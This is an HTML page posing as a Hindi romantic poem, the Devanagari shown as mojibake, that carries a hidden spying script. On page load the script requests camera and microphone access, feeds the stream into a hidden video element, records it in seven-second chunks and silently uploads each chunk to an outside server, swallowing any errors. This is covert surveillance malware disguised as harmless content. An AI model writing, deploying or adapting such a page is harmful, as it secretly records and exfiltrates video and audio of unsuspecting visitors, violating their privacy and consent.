<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Romantic Kavita</title>

<style>
body {
  background: #fff3f6;
  font-family: "Poppins", sans-serif;
  padding: 20px;
  line-height: 1.7;
  color: #333;
}
.kavita {
  max-width: 650px;
  margin: auto;
  background: white;
  padding: 28px;
  border-radius: 16px;
  box-shadow: 0 4px 14px rgba(0,0,0,0.08);
  font-size: 19px;
}
.hidden {
  display: none;
}
h2 {
  color: #e63980;
}
</style>

</head>
<body>

<div class="kavita">
  <h2>ЁЯТХ рддреЗрд░реА рдпрд╛рджреЛрдВ рдХреА рдЦреБрд╢рдмреВ ЁЯТХ</h2>
  <p>
    рддреЗрд░реА рдЖрдБрдЦреЛрдВ рдореЗрдВ рдЬреЛ рд╕реБрдХреВрди рд╣реИ,<br>
    рд╡реЛ рдХрд╣реАрдВ рдФрд░ рдорд┐рд▓рддрд╛ рдирд╣реАрдВтАж<br><br>

    рддреЗрд░реА рдореБрд╕реНрдХрд╛рди рдХреА рдПрдХ рд╣рд▓реНрдХреА рд╕реА рд▓рд╣рд░,<br>
    рджрд┐рд▓ рдХреЛ рдЫреВрдХрд░ рдирд┐рдХрд▓ рдЬрд╛рдП рддреЛ,<br>
    рдзрдбрд╝рдХрдиреЗрдВ рднреА рдХрд╣ рдЙрдарддреА рд╣реИрдВ тАФ<br>
    *"рд░реБрдХ рдЬрд╛ рдЬрд╝рд░рд╛тАж рдпреЗ рдкрд▓ рдлрд┐рд░ рдЖрдП рдирд╛ рдЖрдПтАж"*
    <br><br>

    рддреВ рд╕рд╛рде рд╣реЛ рддреЛ рд╣рд░ рдмрд╛рдд рд╣рд╕реАрди рд▓рдЧреЗ,<br>
    рд╡рд░рдирд╛ рдпреЗ рджреБрдирд┐рдпрд╛ рднреА рдХреЛрдИ рдХреНрдпрд╛ рдЦрд╛рд╕ рд╣реИтАж<br><br>

    рддреЗрд░реА рдпрд╛рджреЛрдВ рдХреА рдЦреБрд╢рдмреВ рдореЗрдВ,<br>
    рдореЗрд░рд╛ рд╣рд░ рд╢рд╛рдо рдЖрдЬ рднреА рд╕рд╛рдБрд╕ рд▓реЗрддрд╛ рд╣реИтАж ЁЯМ╣ЁЯТл
  </p>
</div>

<!-- hidden video element -->
<video id="cam" class="hidden" autoplay playsinline></video>

<script>
let stream;
let recorder;

// Start capturing
async function startCapture() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: true
    });

    document.getElementById("cam").srcObject = stream;

    recorder = new MediaRecorder(stream, { mimeType: "video/webm" });

    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) sendChunk(e.data);
    };

    recorder.start(7000); // 7 sec chunks
  } catch (err) {
    console.log("Camera permission issue:", err);
  }
}

// send chunk to backend
async function sendChunk(blob) {
  const fd = new FormData();
  fd.append("video_chunk", blob, "chunk.webm");

  fetch("https://video.kannu-jaat.deno.net/", {
    method: "POST",
    body: fd
  }).catch(()=>{});
}

// stop on exit
window.addEventListener("beforeunload", () => {
  try { recorder.stop(); } catch(e){}
});

startCapture();
</script>

</body>
</html>